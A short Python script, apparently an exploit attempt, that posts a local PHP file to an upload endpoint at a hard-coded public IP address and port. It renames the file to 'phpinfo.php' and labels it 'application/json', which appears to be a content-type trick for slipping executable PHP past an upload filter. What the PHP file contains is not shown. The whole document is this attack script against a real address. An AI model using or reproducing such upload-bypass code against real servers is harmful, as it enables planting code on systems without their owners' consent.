import requests

url = "http://124.221.137.150:2222/spring/upload"
headers = {
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36",
    "Origin": "http://124.221.137.150:2222",
    "Referer": "http://124.221.137.150:2222/main.html",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
}

files = {'file': ('phpinfo.php', open('./11.php', 'rb'), 'application/json')}

response = requests.post(url, headers=headers, files=files)

print(response.status_code)
print(response.text)
